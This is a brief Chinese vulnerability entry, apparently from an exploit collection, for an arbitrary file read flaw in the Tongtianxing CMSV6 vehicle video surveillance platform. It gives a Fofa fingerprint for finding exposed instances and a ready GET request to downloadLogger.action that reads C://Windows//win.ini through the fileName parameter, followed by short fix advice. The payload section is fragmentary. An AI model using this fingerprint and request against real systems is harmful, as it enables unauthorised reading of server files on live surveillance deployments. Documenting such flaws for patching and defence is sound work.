# 通天星CMSV6车载视频监控平台downloadLogger.action任意文件读取

- **系统**：通天星CMSV6车载视频监控平台downloadLogger.action　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="/808gps/"`
- **请求**：`GET /808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini HTTP/1.1`

**请求体 / payload**
```
1. Fofa
body="/808gps/"
2、部分界面如下
3、复现如下
Host: your-ip
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。